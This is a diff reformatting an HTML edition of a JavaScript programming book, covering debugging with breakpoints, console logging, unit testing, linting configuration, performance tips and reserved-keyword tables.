@@ -25046,63 +25453,85 @@ is essentially a shortcut for document.querySelectorAll.</p>
 <p>Breakpoints pause your program once execution reaches a certain point.
 You can then step through the program line by line, observing its
 execution and inspecting the contents of your variables.</p>
+
 <p>There are three ways of creating breakpoints.</p>
+
 <ol type="1" start="1">
   <li>From code, using the debugger; statement.</li>
   <li>From the browser, using the Developer Tools.</li>
   <li>From an Integrated Development Environment (IDE).</li>
 </ol>
+
 <h4>Debugger Statement</h4>
+
 <p>You can place a debugger; statement anywhere in your JavaScript code. Once the
 JS interpreter reaches that line, it will stop the script execution,
 allowing you to inspect variables and step through your code.</p>
+
 <h4>Developer Tools</h4>
+
 <p>The second option is to add a breakpoint directly into the code from
 the browser&apos;s Developer Tools.</p>
+
 <h4>Opening the Developer Tools</h4>
+
 <b>Chrome or Firefox</b>
+
 <ol type="1" start="1">
   <li>Press F12 to open Developer Tools</li>
   <li>Switch to the Sources tab (Chrome) or Debugger tab (Firefox)</li>
   <li>Press Ctrl + P and type the name of your JavaScript file</li>
   <li>Press Enter to open it.</li>
 </ol>
+
 <h4>Internet Explorer or Edge</h4>
+
 <ol type="1" start="1">
   <li>Press F12 to open Developer Tools</li>
   <li>Switch to the Debugger tab.</li>
   <li>Use the folder icon near the upper-left corner of the window to open
     a file-selection pane; you can find your JavaScript file there.</li>
 </ol>
+
 <h4>Safari</h4>
+
 <ol type="1" start="1">
   <li>Press Command + Option + C to open Developer Tools</li>
   <li>Switch to the Resources tab</li>
   <li>Open the &quot;Scripts&quot; folder in the left-side panel</li>
   <li>Select your JavaScript file.</li>
 </ol>
+
 <h4>Adding a breakpoint from the Developer Tools</h4>
 <p>Once you have your JavaScript file open in Developer Tools, you can
 click a line number to place a breakpoint. The next time your program
 runs, it will pause there.</p>
+
 <p><b>Note about Minified Sources:</b> If your source is minified, you can
 Pretty Print it (convert to readable format). In Chrome, this is done
 by clicking on the {} button in the bottom right corner of the source
 code viewer.</p>
+
 <h4>IDEs</h4>
+
 <h4>Visual Studio Code (VSC)</h4>
+
 <p>VSC has <a href="https://code.visualstudio.com/docs/editor/debugging">
 built-in support</a> for debugging JavaScript.</p>
+
 <ol type="1" start="1">
   <li>Click the Debug button on the left or Ctrl + Shift + D</li>
   <li>If not already done, create a launch configuration file (launch.json) 
     by pressing the gear icon.</li>
   <li>Run the code from VSC by pressing the green play button or hit F5.</li>
 </ol>
+
 <h4>Adding a breakpoint in VSC</h4>
+
 <p>Click next to the line number in your JavaScript source file to add a
 breakpoint (it will be marked red). To delete the breakpoint, click
 the red circle again.</p>
+
 <p><b>Tip:</b> You can also utilise the conditional breakpoints in
 browser&apos;s dev tools. These help in skipping unnecessary breaks in
 execution. Example scenario: you want to examine a variable in a loop
@@ -25119,16 +25548,19 @@ exactly at 5th iteration.</p>
 <h3 id="ch99-3">Section 99.3: Using setters and getters to find what changed a property</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Let&apos;s say you have an object like this:</p>
+
 <pre>
 <b>var</b> myObject = {
   name: &apos;Peter&apos;
 }
 </pre>
+
 <!-- page 437 -->
 <p>Later in your code, you try to access myObject.name and you get <b>George</b> instead
 of <b>Peter</b>. You start wondering who changed it and where exactly it
 was changed. There is a way to place a debugger (or something else) on
 every set (every time someone does myObject.name = &apos;something&apos;):</p>
+
 <pre>
 <b>var</b> myObject = {
   &lowbar;name: &apos;Peter&apos;,
@@ -25136,6 +25568,7 @@ every set (every time someone does myObject.name = &apos;something&apos;):</p>
   <b>get</b> name(){<b>return</b> <b>this</b>.&lowbar;name}
 }
 </pre>
+
 <p>Note that we renamed name to &lowbar;name and we are going to define a
 setter and a getter for name.</p>
 <b>set</b> is the setter. That is a sweet spot where you can place debugger, console.trace(), 
@@ -25145,6 +25578,7 @@ functional object with debugging functionality.</p>
 <p>Most of the time, though, the object that gets changed is not under
 our control. Fortunately, we can define setters and getters on
 <b>existing</b> objects to debug them.</p>
+
 <pre>
 // <i>First, save the name to &lowbar;name, because we are going to use name for setter/getter</i>
 otherObject.&lowbar;name = otherObject.name;
@@ -25155,6 +25589,7 @@ Object.defineProperty(otherObject, &quot;name&quot;, {
   <b>get</b>: <b>function</b>() {<b>return</b> <b>this</b>.&lowbar;name}
 });
 </pre>
+
 <p>Check out <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set">setters</a>
 and <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get">getters</a> 
 at MDN for more information.</p>
@@ -25173,6 +25608,7 @@ devices. Most commonly, this will be the browser&apos;s JavaScript console
 <a href="https://developer.apple.com/safari/tools/">Safari</a>, and
 <a href="https://developer.microsoft.com/en-us/microsoft-edge/platform/documentation/f12-devtools-guide/console/">Edge</a>
 for more information).</p>
+
 <pre>
 // <i>At its simplest, you can &apos;log&apos; a string</i>
 console.log(&quot;Hello, World!&quot;);
@@ -25184,6 +25620,7 @@ console.log(&quot;%s %s&quot;, &quot;Hello&quot;, &quot;World!&quot;);
 <b>var</b> arr = &lbrack;1, 2, 3&rbrack;;
 console.log(arr.length, <b>this</b>);
 </pre>
+
 <!-- page 438 -->
 <P>You can use different console methods to highlight your output in
 different ways. Other methods are also useful for more advanced
@@ -25256,6 +25693,7 @@ Google Developers</a>.</p>
 <pre>
 debug(functionName);
 </pre>
+
 <p>The next time functionName function runs, the debugger will stop on its first line.</p>
 <!-- page 439 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -25332,6 +25770,7 @@ on the results of an external ResponseProcessor that takes time to
 execute.</p>
 <p>For simplicity we&apos;ll assume that the processResponse method won&apos;t
 ever fail.</p>
+
 <pre>
 import {processResponse} from &apos;../utils/response_processor&apos;;
 &nbsp;
@@ -25344,6 +25783,7 @@ import {processResponse} from &apos;../utils/response_processor&apos;;
 &nbsp;
 module.exports = ping;
 </pre>
+
 <p>To test this we can leverage the following tools.</p>
 <ol type="1" start="1">
   <li><a href="https://mochajs.org/">mocha</a></li>
@@ -25353,11 +25793,14 @@ module.exports = ping;
   <li><a href="https://github.com/domenic/chai-as-promised">chai-as-promised</a></li>
 </ol>
 <p>I use the following test script in my package.json file.</p>
+
 <pre>
 &quot;test&quot;: &quot;NODE_ENV=test mocha &dash;&dash;compilers js:babel-core/register &dash;&dash;;require
 ./test/unit/test_helper.js &bsol;recursive test/&ast;&ast;/&ast;&lowbar;spec.js&quot;
 </pre>
+
 <p>This allows me to use es6 syntax. It references a test_helper that will look like</p>
+
 <pre>
 import chai from &apos;chai&apos;;
 import sinon from &apos;sinon&apos;;
@@ -25369,6 +25812,7 @@ chai.use(sinonChai);
 chai.use(chaiAsPromised);
 sinonStubPromise(sinon);
 </pre>
+
 <p>Proxyquire allows us to inject our own stub in the place of the
 external ResponseProcessor. We can then use sinon to spy on that
 stub&apos;s methods. We use the extensions to chai that chai-as-promised injects to check
@@ -25408,8 +25852,10 @@ describe(&apos;ping&apos;, () =&gt; {
   })
 });
 </pre>
+
 <p>Now instead let&apos;s assume you wish to test something that uses the
 response from ping.</p>
+
 <pre>
 import {ping} from &apos;./ping&apos;;
 &nbsp;
@@ -25420,6 +25866,7 @@ import {ping} from &apos;./ping&apos;;
 }
 module.exports = pingWrapper;
 </pre>
+
 <p>To test the pingWrapper we leverage</p>
 <ol type="1" start="1">
   <li><a href="http://sinonjs.org/">sinon</a></li>
@@ -25466,6 +25913,7 @@ describe(&apos;pingWrapper&apos;, () =&gt; {
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>At its most basic level, Unit Testing in any language provides
 assertions against some known or expected output.</p>
+
 <pre>
 <b>function</b> assert( outcome, description ) {
   <b>var</b> passFail = outcome ? &apos;pass&apos; : &apos;fail&apos;;
@@ -25473,10 +25921,12 @@ assertions against some known or expected output.</p>
   <b>return</b> outcome;
 };
 </pre>
+
 <p>The popular assertion method above shows us one quick and easy way to
 assert a value in most web browsers and interpreters like Node.js with
 virtually any version of ECMAScript.</p>
 <p>A good unit test is designed to test a discreet unit of code; usually a function.</p>
+
 <pre>
 <b>function</b> add(num1, num2) {
   <b>return</b> num1 &plus; num2;
@@ -25484,20 +25934,24 @@ virtually any version of ECMAScript.</p>
 <b>var</b> result = add(5, 20);
 assert( result == 24, &apos;add(5, 20) should return 25&hellip;&apos;);
 </pre>
+
 <p>In the example above, the return value from the function add(x, y) or 5 &plus; 20 is clearly
 25 , so our assertion of 24 should fail, and the assert method will log a &quot;fail&quot; line.</p>
 <p>If we simply modify our expected assertion outcome, the test will
 succeed and the resulting output would look something like this.</p>
+
 <pre>
 assert( result == 25, &apos;add(5, 20) should return 25&hellip;&apos;);
 console output:
 &gt; pass: should <b>return</b> 25&hellip;
 </pre>
+
 <p>This simple assertion can assure that in many different cases, your
 &quot;add&quot; function will always return the expected result and requires
 no additional frameworks or libraries to work.</p>
 <p>A more rigorous set of assertions would look like this (using var result(x,y) 
 for each assertion):</p>
+
 <pre>
 assert( result == 0, &apos;add(0, 0) should return 0&hellip;&apos;);
 assert( result == -1, &apos;add(0, -1) should return -1&hellip;&apos;);
@@ -25509,6 +25963,7 @@ assert( result == 1, &apos;add(0, 1) should return 1&hellip;&apos;);
 &gt; pass: should <b>return</b> &minus;1&hellip;
 &gt; pass: should <b>return</b> 1&hellip;
 </pre>
+
 <p>We can now safely say that <b>add(x,y)</b>... <b>should return the sum of two
 integers</b>. We can roll these up into something like this:</p>
 <pre>
@@ -25623,6 +26078,7 @@ configuration file named .jshintrc that will be used when linting your
 program. This is convent if you want to share configurations between
 projects.</p>
 <p>Example .jshintrc file</p>
+
 <pre>
 {
   &quot;-W097&quot;: <b>false</b>, // <i>Allow &quot;use strict&quot; at document level</i>
@@ -25646,7 +26102,9 @@ projects.</p>
   &quot;unused&quot;: <b>true</b>  // <i>warn about unused vars</i>
 }
 </pre>
+
 <p>JSHint also allows configurations for specific lines/blocks of code</p>
+
 <pre>
 <b>switch</b>(operation)
 {
@@ -25670,6 +26128,7 @@ projects.</p>
 globalVariable = &apos;in-another-file.js&apos;;
 <i>/&ast; jshint +W117 &ast;/</i>
 </pre>
+
 <p><a href="http://jshint.com/docs/options/">More configuration options</a>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch102-2">Section 102.2: ESLint / JSCS</h3>
@@ -25689,6 +26148,7 @@ website</a> for getting started.</p>
   }
 }
 </pre>
+
 <p>A sample configuration file where ALL rules are set to off, with descriptions 
 for what they do can be found <a href="https://gist.github.com/cletusw/e01a85e399ab563b1236">here</a>.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -25716,6 +26176,7 @@ NPM</a> or <a href="https://gist.github.com/bretdavidson/3189814#file-jslint-opt
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Chaining assignments as part of a <b>var</b> declaration will create global 
 variables unintentionally.</p>
+
 <pre>
 For example:
 &nbsp;
@@ -25725,23 +26186,30 @@ For example:
 console.log(&apos;a: &apos; &plus; a);
 console.log(&apos;b: &apos; &plus; b);
 </pre>
+
 <p>Will result in:</p>
+
 <pre>
 Uncaught ReferenceError: a is not defined
 &apos;b: 0&apos;
 </pre>
+
 <p>In the above example, a is local but b becomes global. This is because
 of the right to left evaluation of the = operator. So the above code
 actually evaluated as</p>
+
 <pre>
 <b>var</b> a = (b = 0);
 </pre>
+
 <p>The correct way to chain var assignments is:</p>
 <pre>
 <b>var</b> a, b;
 a = b = 0;
 </pre>
+
 <p>Or:</p>
+
 <pre>
 <b>var</b> a = 0, b = a;
 </pre>
@@ -25762,6 +26230,7 @@ optimizer on functions that contain a try/catch block.</p>
 <p>If you need to handle exceptions in performance-critical code, it can
 be faster in some cases to keep the try/catch in a separate function.
 For example, this function will not be optimized by some implementations:</p>
+
 <pre>
 <b>function</b> myPerformanceCriticalFunction() {
   <b>try</b> {
@@ -25774,6 +26243,7 @@ For example, this function will not be optimized by some implementations:</p>
 <p>However, you can refactor to move the slow code into a separate
 function (that <i>can</i> be optimized) and call it from inside the <b>try</b>
 block.</p>
+
 <pre>
 // <i>This function can be optimized</i>
 <b>function</b> doCalculations() {
@@ -25788,6 +26258,7 @@ block.</p>
   }
 }
 </pre>
+
 <p>Here&apos;s a jsPerf benchmark showing the difference:
 <a href="https://jsperf.com/try-catch-deoptimization">try-catch-deoptimization</a>. 
 In the current version of most browsers, there shouldn&apos;t be much difference if any, but in
@@ -25816,6 +26287,7 @@ browser to run slowly or even become unresponsive.</p>
 <p>The consequence of updating the document too frequently is illustrated
 with the following example of adding items to a list.</p>
 <p>Consider the following document containing a <b>&lt;ul&gt;</b> element:</p>
+
 <pre>
 &lt;!DOCTYPE html<b>&gt;</b>
 <b>&lt;</b><b>html</b><b>&gt;</b>
@@ -25824,8 +26296,10 @@ with the following example of adding items to a list.</p>
   <b>&lt;</b><b>/body</b><b>&gt;</b>
 <b>&lt;</b><b>/html</b><b>&gt;</b>
 </pre>
+
 <p>We add 5000 items to the list looping 5000 times (you can try this
 with a larger number on a powerful computer to increase the effect).</p>
+
 <pre>
 <b>var</b> list = document.getElementById(&quot;list&quot;);
 <b>for</b>(<b>var</b> i = 1; i &lt;= 5000; i++) {
@@ -25846,6 +26320,7 @@ list.innerHTML = html;  // <i>update once</i>
 document.createDocumentFragment()</a> can be used as a lightweight container for the HTML created by the 
 loop. This method is slightly faster than modifying the container element&apos;s innerHTML property 
 (as shown below).</p>
+
 <pre>
 <b>var</b> list = document.getElementById(&quot;list&quot;);
 <b>var</b> fragment = document.createDocumentFragment();
@@ -25897,6 +26372,7 @@ method of Date, therefore you always use it as Date.now().</p>
 execution of our function, and we are going to use the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/now">
 Performance.now()</a> method that returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMHighResTimeStamp">
 DOMHighResTimeStamp</a>, measured in milliseconds, accurate to one thousandth of a millisecond.</p>
+
 <pre>
 <b>let</b> startTime, endTime;
 &nbsp;
@@ -25916,10 +26392,13 @@ endTime = performance.now();
 // <i>The difference is how many milliseconds it took to call myFunction()</i>
 console.debug(&apos;Elapsed time:&apos;, (endTime &minus; startTime));
 </pre>
+
 <p>The result in console will look something like this:</p>
+
 <pre>
 Elapsed time: 0.10000000009313226
 </pre>
+
 <p>Usage of <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/now">performance.now()</a> 
 has the highest precision in browsers with accuracy to one thousandth
 of a millisecond, but the lowest <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/now#Browser_compatibility">
@@ -25941,6 +26420,7 @@ console.log(Date.now() &minus; t0); // <i>print elapsed time between stored t0 a
 <p><b>Example 3</b> using: console.time(&quot;label&quot;) & console.timeEnd(&quot;label&quot;)</p>
 <p>In this example we are doing the same task as in Example 2, but we are going to use the 
 console.time(&quot;label&quot;) & console.timeEnd(&quot;label&quot;) methods</p>
+
 <pre>
 console.time(&quot;t&quot;);  // <i>start new timer for label name: &quot;t&quot;</i>
 <b>let</b> arr = &lbrack;&rbrack;; // <i>store empty array</i>
@@ -25949,8 +26429,11 @@ console.time(&quot;t&quot;);  // <i>start new timer for label name: &quot;t&quot
 }
 console.timeEnd(&quot;t&quot;);  // <i>stop the timer for label name: &quot;t&quot; and print elapsed time</i>
 </pre>
-<p><b>Exemple 4</b> using process.hrtime()</p>
+
+<p><b>Example 4</b> using process.hrtime()</p>
+
 <p>In Node.js programs this is the most precise way to measure spent time.</p>
+
 <pre>
 <b>let</b> start = process.hrtime();
 &nbsp;
@@ -25974,11 +26457,13 @@ side-effects outside their scope so, you should not add memoizers to
 functions that are unpredictable or depend on external resources (like
 AJAX calls or randomly returned values).</p>
 <p>Let&apos;s say I have a recursive factorial function:</p>
+
 <pre>
 <b>function</b> fact(num) {
   <b>return</b> (num === 0) ? 1 : num &ast; fact(num &minus; 1);
 }
 </pre>
+
 <p>If I pass small values from 1 to 100 for example, there would be no
 problem, but once we start going deeper, we might blow up the call
 stack or make the process a bit painful for the JavaScript engine
@@ -25989,6 +26474,7 @@ ES6 has tail-call optimization included).</p>
 with their corresponding factorials but, I&apos;m not sure if I advise
 that! Let&apos;s create a memoizer, shall we?</p>
 <!-- page 452 -->
+
 <pre>
 <b>var</b> fact = (<b>function</b>() {
   <b>var</b> cache = {};  // <i>Initialise a memory cache object</i>
@@ -26023,6 +26509,7 @@ that! Let&apos;s create a memoizer, shall we?</p>
   <b>return</b> checkCache;
 }());
 </pre>
+
 <p>Now we can start using it:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 54.  (4xx) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -26048,6 +26535,7 @@ the original and has access to the cache object):</p>
 <p>WARNING: ES6 syntax, if you don&apos;t like it, replace &hellip; with nothing
 and use the var args = Array.prototype.slice.call(null, arguments); trick; 
 replace const and let with var, and the other things you already know.</p>
+
 <pre>
 <b>function</b> memoize(func) {
   <b>let</b> cache = {};
@@ -26066,6 +26554,7 @@ replace const and let with var, and the other things you already know.</p>
   <b>return</b> memoized; // <i>Return the memoized function</i>
 }
 </pre>
+
 <p>Now notice that this will work for multiple arguments but won&apos;t be of
 much use in object-oriented methods I think, you may need an extra object for 
 dependencies. Also, func.apply(null, args) can be replaced with func(&hellip;.args) 
@@ -26073,6 +26562,7 @@ since array destructuring will send them separately instead of as an
 array form. Also, just for reference, passing an array as an argument to 
 func won&apos;t work unlessFunction.<b>prototype</b>.apply as I did.</p>
 <p>To use the above method you just:</p>
+
 <pre>
 <b>const</b> newFunction = memoize(oldFunction);
 &nbsp;
@@ -26108,7 +26598,9 @@ class instances with a for loop. Within the loop, I&apos;m assigning the
 same string to all object&apos;s &quot;x&quot; property before array
 initialization. If constructor initializes &quot;x&quot; property with null,
 array always processes better even if it&apos;s doing extra statement.</p>
+
 <p>This is code:</p>
+
 <pre>
 <b>function</b> f1() {
   <b>var</b> P = <b>function</b>() {
@@ -26152,6 +26644,7 @@ array always processes better even if it&apos;s doing extra statement.</p>
 <h3 id="ch104-6">Section 104.6: Reuse objects rather than recreate</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h4>Example A</h4>
+
 <pre>
 <b>var</b> i, a, b, len;
 a = {x: 0, y: 0}
@@ -26170,14 +26663,17 @@ a = {x: 0, y: 0}
   b = test1(a);
 }
 </pre>
+
 <p>Loop B is 4 (400%) times faster than Loop A</p>
-<P>It is very inefficient to create a new object in performance code.
+
+<p>It is very inefficient to create a new object in performance code.
 Loop A calls function test() which returns a new object every call. The
 created object is discarded every iteration, Loop B calls test1() that
 requires the object returns to be supplied. It thus uses the same
 object and avoids allocation of a new object, and excessive GC hits.
 (GC were not included in the performance test)</p>
 <h4>Example B</h4>
+
 <pre>
 <b>var</b> i, a, b, len;
 a = {x: 0, y: 0}
@@ -26198,6 +26694,7 @@ a = {x: 0, y: 0}
   b = test3(a);
 }
 </pre>
+
 <p>Loop B is 5 (500%) times faster than loop A</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch104-7">Section 104.7: Prefer local variables to globals, attributes, and indexed values</h3>
@@ -26208,6 +26705,7 @@ indexed value in an array, or an attribute in an associative array, it
 will first look for the parent array before it finds the contents.</p>
 <p>This has implications when working with performance-critical code.
 Take for instance a common <b>for</b> loop:</p>
+
 <pre>
 <b>var</b> global_variable = 0;
 <b>function</b> foo() {
@@ -26217,6 +26715,7 @@ Take for instance a common <b>for</b> loop:</p>
   }
 }
 </pre>
+
 <!-- page 456 -->
 <p>For every iteration in <b>for</b> loop, the engine will lookup items,
 lookup the length attribute within items, lookup items again, lookup
@@ -26224,6 +26723,7 @@ the value at index i of items, and then finally lookup
 global_variable, first trying the local scope before checking the
 global scope.</p>
 <p>A performant rewrite of the above function is:</p>
+
 <pre>
 <b>function</b> foo() {
   <b>var</b> local_variable = 0;
@@ -26233,6 +26733,7 @@ global scope.</p>
   <b>return</b> local_variable;
 }
 </pre>
+
 <p>For every iteration in the rewritten <b>for</b> loop, the engine will
 lookup li, lookup items, lookup the value at index i, and lookup
 local_variable, this time only needing to check the local scope.</p>
@@ -26243,6 +26744,7 @@ local_variable, this time only needing to check the local scope.</p>
 small type for your values, it will be able to optimize the executed code.</p>
 <p>In this example, we&apos;ll use this trivial function summing the elements
 of an array and outputting the time it took:</p>
+
 <pre>
 // <i>summing properties</i>
 <b>var</b> sum = (
@@ -26257,22 +26759,29 @@ of an array and outputting the time it took:</p>
     <b>return</b> sum;
 })(arr);
 </pre>
+
 <p>Let&apos;s make an array and sum the elements:</p>
+
 <pre>
 <b>var</b>    N = 12345,
               arr = &lbrack;&rbrack;;
 <b>for</b> (<b>var</b> i = 0; i &lt; N; i++) arr&lbrack;i&rbrack; = Math.random();
 </pre>
+
 <p>Result:</p>
+
 <pre>
 Summing took 384416 nanoseconds
 </pre>
+
 <p>Now, let&apos;s do the same but with only integers:</p>
+
 <pre>
 <b>var</b> N = 12345, 
   arr = &lbrack;&rbrack;;
 <b>for</b> (<b>var</b> i = 0; i &lt; N; i++) arr&lbrack;i&rbrack; = Math.round(1000 &ast; Math.random());
 </pre>
+
 <p>Result:</p>
 <!-- page 457 -->
 <pre>
@@ -26521,6 +27030,7 @@ you cannot use as variables, labels, or function names.</h4>
     </tr>
   </thead>
 </table>
+
 <h4>ECMAScript 5 / 5.1</h4>
 <p>There was no change since <i>ECMAScript 3</i>.</p>
 
@@ -26540,7 +27050,7 @@ and synchronized; it added <b>let</b> and yield.</p>
     <tr>
       <td><b>break</b></td>
       <td><b>finally</b></td>
-      <td><b>public</b></td>
+      <td>public</td>
     </tr>
     <tr>
       <td><b>case</b></td>
@@ -26557,59 +27067,162 @@ and synchronized; it added <b>let</b> and yield.</p>
       <td>if</td>
       <td>super</td>
     </tr>
+      <td><b>const</b></td>
+      <td>implements</td>
+      <td>switch</td>
+    </tr>
+      <td><b>continue</b></td>
+      <td>import</td>
+      <td><b>this</b></td>
+    </tr>
     <tr>
+      <td>debugger</td>
+      <td>in</td>
+      <td><b>throw</b></td>
+    </tr>
+      <td><b>default</b></td>
+      <td><b>instanceof</b></td>
+      <td>true</td>
+    </tr>
+      <td><b>delete</b></td>
+      <td>interface</td>
+      <td><b>try</b></td>
+    </tr>
+    </tr>
+      <td>do</td>
+      <td><b>let</b></td>
+      <td><b>typeof</b></td>
+    </tr>
+    </tr>
+      <td><b>else</b></td>
+      <td><b>new</b></td>
+      <td><b>var</b></td>
+    </tr>
+    </tr>
+      <td>enum</td>
+      <td>null</td>
+      <td><b>void</b></td>
+    </tr>
+    </tr>
+      <td>export</td>
+      <td>package</td>
+      <td>while</td>
+    </tr>
+    </tr>
+      <td>extends</td>
+      <td>private</td>
+      <td>with</td>
+    </tr>
+    </tr>
+      <td><b>false</b></td>
+      <td>protected</td>
+      <td><b>yield</b></td>
+    </tr>
+  </thead>
+</table>
 
-| <b><i>A</i></b>  <b><i>F</i></b> | <b><i>F</i></b>  <b><i>P</i></b>     | <b><i>P</i></b>   |
-       |         | <b><i>Z</i></b>  |
-| <b>break</b>     | <b>finally</b>     | public     |
-| <b>case</b>      | <b>for</b>     | <b>return</b> |
-| <b>catch</b>     | <b>function</b>    | <b>static</b> |
-| class     | if      | super  |
-<b>const</b> implements<b>switch continue</b>import <b>this</b> debuggerin
-<b>throw</b>
-<b>default</b>      <b>instanceoftrue</b>    
-  <b>delete</b>   interface <b>try</b>
-  do   <b>let</b>       <b>typeof</b>
-  <b>else</b>     <b>new</b>       <b>var</b>
-  enum     <b>null</b>      <b>void</b>
-  export       package       while
-  extends      private       with
-  <b>false</b>    protected     <b>yield</b>
+<blockquote>
 implements, <b>let</b>, private, public, interface, package, protected,
 <b>static</b>, and yield are <b>disallowed in strict mode only</b>.
-eval and arguments are not reserved words but they act like it in
-<b>strict mode</b>. <b>ECMAScript 6 / ECMAScript 2015</b>
-| <b><i>A</i></b>  <b><i>E E</i></b>  <b><i>R</i></b>       | <b><i>S</i></b>   |
-|                                     | <b><i>Z</i></b>      |
-| <b>break</b> export                                    | super          |
-| <b>case</b> extends                                    | <b>switch</b>     |
-| <b>catch finally</b>                                   | <b>this</b>       |
-| class <b>for</b>                                       | <b>throw</b>      |
-| <b>const function</b>                                  | <b>try</b>        |
-| <b>continue</b>if                                      | <b>typeof</b>     |
-| debuggerimport                                      | <b>var</b>        |
-| <b>default</b> in                                      | <b>void</b>       |
-<b>delete instanceof</b>while
-do <b>new</b> with
-<b>else return</b> yield
-Future reserved keywords
-The following are reserved as future keywords by the ECMAScript
+</blockquote>
+
+<blockquote>
+eval and arguments are not reserved words but they act like it in <b>strict mode</b>.
+</blockquote>
+
+
+<b>ECMAScript 6 / ECMAScript 2015</b>
+<table border="1" style="width:200px">
+  <thead>
+    <tr>
+      <th><b>A-E</b></th>
+      <th><b>E-R</b></th>
+      <th><b>S-Z</b></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><b>break</b></td>
+      <td>export</td>
+      <td>super</td>
+    </tr>
+    <tr>
+      <td><b>case</b></td>
+      <td>extends</td>
+      <td><b>switch</b></td>
+    </tr>
+    <tr>
+      <td><b>catch</b></td>
+      <td><b>finally</b></td>
+      <td><b>this</b></td>
+    </tr>
+    <tr>
+      <td>class</td>
+      <td><b>for</b></td>
+      <td><b>throw</b></td>
+    </tr>
+    <tr>
+      <td><b>const</b></td>
+      <td><b>function</b></td>
+      <td><b>try</b></td>
+    </tr>
+    <tr>
+      <td><b>continue</b></td>
+      <td>if</td>
+      <td><b>typeof</b></td>
+    </tr>
+    <tr>
+      <td>debugger</td>
+      <td>import</td>
+      <td><b>var</b></td>
+    </tr>
+    <tr>
+      <td><b>default</b></td>
+      <td>in</td>
+      <td><b>void</b></td>
+    </tr>
+    <tr>
+      <td><b>delete</b></td>
+      <td><b>instanceof</b></td>
+      <td>while</td>
+    </tr>
+    <tr>
+      <td>do</td>
+      <td><b>new</b></td>
+      <td>with</td>
+    </tr>
+    <tr>
+      <td><b>else</b></td>
+      <td><b>return</b></td>
+      <td>yield</td>
+    </tr>
+
+<p>Future reserved keywords</p>
+
+<p>The following are reserved as future keywords by the ECMAScript
 specification. They have no special functionality at present, but they
-might at some future time, so they cannot be used as identifiers. enum
-The following are only reserved when they are found in strict mode
-code:
-implementspackage public interface private &grave;static&apos; <b>let</b>
-protected
-Future reserved keywords in older standards
-The following are reserved as future keywords by older ECMAScript
-specifications (ECMAScript 1 till 3).
-abstractfloat short boolean <b>goto</b> synchronized byte
-<b>instanceof</b>throws
-char int transient double long volatile final native
-Additionally, the literals null, true, and false cannot be used as
-identifiers in ECMAScript.
-From the [Mozilla Developer
-Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar).
+might at some future time, so they cannot be used as identifiers.</p>
 
+<h5>enum</h5>
 
+<p>The following are only reserved when they are found in strict mode code:</p>
 
+| implements | package | public |
+| interface  | private | &grave;static&apos; |
+| <b>let</b> | protected | |
+
+<p>Future reserved keywords in older standards</p>
+
+<p>The following are reserved as future keywords by older ECMAScript specifications (ECMAScript 1 till 3).</p>
+
+| abstract | float       | short |
+| boolean  | <b>goto</b> | synchronized |
+| byte     | <b>instanceof</b> | throws |
+| char     | int               | transient |
+| double   | long              | volatile |
+| final    | native | |
+
+<p>Additionally, the literals null, true, and false cannot be used as
+identifiers in ECMAScript.</p>
+
+<p>From the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar">Mozilla Developer Network</a>.</p>
